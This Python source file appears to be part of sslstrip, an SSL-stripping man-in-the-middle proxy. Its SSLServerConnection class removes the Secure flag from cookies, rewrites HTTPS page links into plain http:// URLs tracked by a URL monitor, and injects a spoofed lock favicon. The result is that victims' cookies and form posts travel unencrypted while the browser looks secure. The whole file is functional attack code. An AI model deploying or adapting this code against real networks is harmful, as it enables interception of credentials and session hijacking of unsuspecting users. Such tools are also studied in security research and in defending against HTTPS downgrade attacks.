
import logging, re, string

from ServerConnection import ServerConnection

class SSLServerConnection(ServerConnection):

    ''' 
    For SSL connections to a server, we need to do some additional stripping.  First we need
    to make note of any relative links, as the server will be expecting those to be requested
    via SSL as well.  We also want to slip our favicon in here and kill the secure bit on cookies.
    '''

    cookieExpression   = re.compile(r"([ \w\d:#@%/;$()~_?\+-=\\\.&]+); ?Secure", re.IGNORECASE)
    cssExpression      = re.compile(r"url\(([\w\d:#@%/;$~_?\+-=\\\.&]+)\)", re.IGNORECASE)
    iconExpression     = re.compile(r"<link rel=\"shortcut icon\" .*href=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>", re.IGNORECASE)
    linkExpression     = re.compile(r"<((a)|(link)|(img)|(script)|(frame)) .*((href)|(src))=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>", re.IGNORECASE)
    headExpression     = re.compile(r"<head>", re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        ServerConnection.__init__(self, command, uri, postData, headers, client)

    def getLogLevel(self):
        return logging.INFO

    def getPostPrefix(self):
        return "SECURE POST"

    def handleHeader(self, key, value):
        if (key.lower() == 'set-cookie'):
            value = SSLServerConnection.cookieExpression.sub("\g<1>", value)

        ServerConnection.handleHeader(self, key, value)

    def stripFileFromPath(self, path):
        (strippedPath, lastSlash, file) = path.rpartition('/')
        return strippedPath

    def buildAbsoluteLink(self, link):
        absoluteLink = ""
        
        if ((not link.startswith('http')) and (not link.startswith('/'))):                
            absoluteLink = "http://"+self.headers['host']+self.stripFileFromPath(self.uri)+'/'+link

            logging.debug("Found path-relative link in secure transmission: " + link)
            logging.debug("New Absolute path-relative link: " + absoluteLink)                
        elif not link.startswith('http'):
            absoluteLink = "http://"+self.headers['host']+link

            logging.debug("Found relative link in secure transmission: " + link)
            logging.debug("New Absolute link: " + absoluteLink)                            

        if not absoluteLink == "":                
            absoluteLink = absoluteLink.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), absoluteLink);        

    def replaceCssLinks(self, data):
        iterator = re.finditer(SSLServerConnection.cssExpression, data)

        for match in iterator:
            self.buildAbsoluteLink(match.group(1))

        return data

    def replaceFavicon(self, data):
        match = re.search(SSLServerConnection.iconExpression, data)

        if (match != None):
            data = re.sub(SSLServerConnection.iconExpression,
                          "<link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">", data)
        else:
            data = re.sub(SSLServerConnection.headExpression,
                          "<head><link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">", data)
            
        return data
        
    def replaceSecureLinks(self, data):
        data = ServerConnection.replaceSecureLinks(self, data)
        data = self.replaceCssLinks(data)

        if (self.urlMonitor.isFaviconSpoofing()):
            data = self.replaceFavicon(data)

        iterator = re.finditer(SSLServerConnection.linkExpression, data)

        for match in iterator:
            self.buildAbsoluteLink(match.group(10))

        return data
